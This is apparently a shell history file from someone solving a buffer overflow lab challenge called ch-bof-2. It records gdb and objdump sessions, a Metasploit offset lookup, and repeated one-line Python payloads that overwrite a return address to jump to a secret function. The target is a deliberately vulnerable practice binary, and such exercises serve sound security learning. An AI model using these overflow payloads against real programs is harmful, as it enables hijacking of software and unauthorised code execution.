gdb ch-bof-2 
cat ch-bof-2.c
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 356a41346a41336a
objdump -d ch-bof-2 | grep secret_function
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch-bof-2 
exit
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch-bof-2
su user
ls
cd ch-bof-2
touch test
ls
objdump -d ch-bof-2 | grep secret
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch-bof-2 
exit
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch-bof-2 
cd ch-bof-2
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch-bof-2 
touch test
exit
exit..
cd ..
cd ch-bof-2
ls
cat ./ch-bof-2.c
gdb ./ch-bof-2 
objdump -d ./ch-bof-2 | grep secret
objdump -d ./ch-bof-2 | grep secret
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch-bof-2 
cd ..
exit
cat <(python -c "print 'A'*280+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch
gdb ./ch
cat <(python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch
exit
cd ch-bof-2
ls -la
cat ./ch.c
gdb ./ch
objdump -d ch | grep secret
cat <(python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00") - | ./ch
cat <(python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch
cd ..
exit
cd ch-bof-2
ls -la
cat ch.c
gdb ./ch
objdump -d ch | grep secret
python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00'" | ./ch
cat <(python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch
exit
gdb ch
exit
objdump -d ch | grep secret
cd ..
exit
ls
cat ch.c 
objdump -d ch | grep secret
cat <(python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch
exit
